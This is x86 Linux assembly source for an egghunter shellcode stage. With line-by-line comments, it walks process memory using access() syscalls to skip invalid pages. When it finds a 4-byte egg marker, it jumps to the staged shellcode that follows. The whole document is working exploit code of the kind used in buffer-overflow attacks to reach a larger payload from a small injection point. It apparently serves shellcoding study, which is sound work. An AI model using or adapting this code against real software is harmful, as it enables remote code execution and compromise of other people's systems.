global _start

section .text

_start:
	xor ecx, ecx			;; Clear ECX
	mul ecx					;; Clear EAX and EDX
	mov ebx, 0x4890408f		;; Store Egg as 1 less than the real egg in EBX
	inc ebx					;; Inc Egg to real value (prevents it from finding itself)

next_page:
	OR dx, 0xfff			;; Page alignment of memory ptr to PAGE_SIZE - 1 (4095)

next_addr:
	inc edx					;; Increment memory address

	pusha					;; Preserve registers
	lea ebx, [edx + 0x4]	;; Load address to validate
	mov al, 0x21			;; Syscall for Access
	int 0x80				;; Syscall interrupt, as in access(<memory address>, null)
	cmp al, 0xf2			;; Check for EFAULT (0xf2 when fault)
	popa					;; Restore Registers
	
	jz next_page			;; If fault, proceed to next memory page

	cmp [edx], ebx			;; Check address contents for egg
	jnz next_addr			;; If egg not found, go to next address in page
	jmp edx					;; Jump to egg at start of shellcode
